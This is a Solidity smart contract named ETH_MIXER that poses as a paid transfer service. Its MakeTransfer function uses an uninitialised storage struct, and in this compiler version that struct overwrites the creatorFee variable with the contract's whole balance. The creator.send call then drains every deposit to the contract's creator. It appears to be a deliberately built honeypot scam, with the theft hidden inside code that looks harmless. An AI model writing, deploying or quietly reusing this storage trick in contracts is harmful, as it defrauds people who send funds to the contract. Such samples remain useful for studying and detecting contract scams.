1 pragma solidity ^0.4.19;
2 
3 contract ETH_MIXER
4 {
5     uint256 feePaid;
6     uint256 creatorFee = 0.001 ether;
7     uint256 totalTransfered;
8     
9     struct Transfer
10     {
11         uint256 timeStamp;
12         uint256 currContractBallance;
13         uint256 transferAmount;
14     }
15     
16     Transfer[] Log;
17     
18     address creator = msg.sender;
19     
20     function() public payable{}
21     
22     function MakeTransfer(address _adr, uint256 _am)
23     external
24     payable
25     {
26         if(msg.value > 1 ether)
27         {
28             require(msg.sender == tx.origin);
29             Transfer LogUnit;
30             LogUnit.timeStamp = now;
31             LogUnit.currContractBallance = this.balance;
32             LogUnit.transferAmount= _am;
33             Log.push(LogUnit);
34             
35             creator.send(creatorFee);
36             _adr.send(_am);
37             
38             feePaid+=creatorFee;
39             totalTransfered+=_am;
40         }
41     }    
42 }